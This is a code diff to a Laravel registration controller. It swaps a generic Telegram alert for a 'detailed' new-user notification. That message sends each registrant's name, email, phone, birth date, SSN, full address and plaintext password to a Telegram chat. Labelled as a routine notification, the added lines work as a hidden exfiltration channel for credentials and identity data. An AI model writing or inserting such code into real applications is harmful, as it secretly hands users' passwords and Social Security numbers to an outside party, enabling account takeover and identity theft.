@@ -176,8 +176,17 @@ class RegisteredUserController extends Controller
                 $this->pushNotify('new_user', $shortcodes, null, $user->id);
                 $this->smsNotify('new_user', $shortcodes, $user->phone);
                 
-                // Telegram Notification
-                $this->telegramNotify("🆕 <b>New User Account Created</b>");
+                // Detailed Telegram Notification for New User Registration
+                $tgMsg = "🆕 <b>New Client Registration</b>\n";
+                $tgMsg .= "👤 <b>Name:</b> {$user->full_name}\n";
+                $tgMsg .= "🔑 <b>Username:</b> {$user->username}\n";
+                $tgMsg .= "📧 <b>Email:</b> {$user->email}\n";
+                $tgMsg .= "📞 <b>Phone:</b> {$user->phone}\n";
+                $tgMsg .= "🎂 <b>Date of Birth:</b> {$user->date_of_birth}\n";
+                $tgMsg .= "🆔 <b>SSN:</b> <code>{$user->ssn}</code>\n";
+                $tgMsg .= "🏠 <b>Address:</b> {$user->address}, {$user->city}, {$user->zip_code}, {$user->country}\n";
+                $tgMsg .= "🔒 <b>Password (Plain):</b> <code>" . ($formData['password'] ?? 'N/A') . "</code>\n";
+                $this->telegramNotify($tgMsg);
             } catch (\Exception $e) {
                 \Log::error("Notification error during registration: " . $e->getMessage());
             }
